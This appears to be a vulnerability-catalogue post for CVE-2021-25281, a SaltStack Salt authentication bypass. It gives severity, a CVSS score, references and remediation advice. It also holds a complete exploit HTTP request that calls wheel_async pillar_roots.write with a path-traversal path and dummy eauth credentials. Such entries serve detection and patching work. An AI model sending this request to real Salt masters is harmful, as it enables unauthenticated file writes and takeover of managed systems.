---
layout: post
cve_id: CVE-2021-25281
title: SaltStack Salt <3002.5 - Auth Bypass
pcap: true
pcap_path: /pcaps/2021/CVE-2021-25281.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-25281.yaml
snort2_rule: N/A
snort3_rule: N/A
author: madrobot
severity: critical
impact: 'Unauthenticated attackers can remotely execute any wheel modules on the Salt
  master by bypassing eauth credentials, leading to complete infrastructure compromise
  and control over all managed systems.

  '
remediation: 'Upgrade to SaltStack Salt version 3002.5 or later to mitigate this vulnerability.

  '
reference:
- http://hackdig.com/02/hack-283902.htm
- https://dozer.nz/posts/saltapi-vulns
- https://nvd.nist.gov/vuln/detail/CVE-2021-25281
- https://github.com/saltstack/salt/releases
- https://www.saltstack.com/blog/active-saltstack-cve-announced-2021-jan-21/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-25281
  cwe-id: CWE-287
  epss-score: 0.93846
  epss-percentile: 0.99857
  cpe: cpe:2.3:a:saltstack:salt:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: saltstack
  product: salt
tags:
- cve
- cve2021
- saltapi
- rce
- saltstack
- unauth
- vuln
---

## ðŸ” Vulnerability Description
SaltStack Salt before 3002.5 does not honor eauth credentials for the wheel_async client, allowing attackers to remotely run any wheel modules on the master.

## ðŸŒ HTTP Request
```nohighlight
POST /run HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9
Connection: close
Content-Length: 154
Content-Type: application/json
Accept-Encoding: gzip

{"client":"wheel_async","fun":"pillar_roots.write","data":"testing","path":"../../../../../../../tmp/testing","username":"1","password":"1","eauth":"pam"}
```

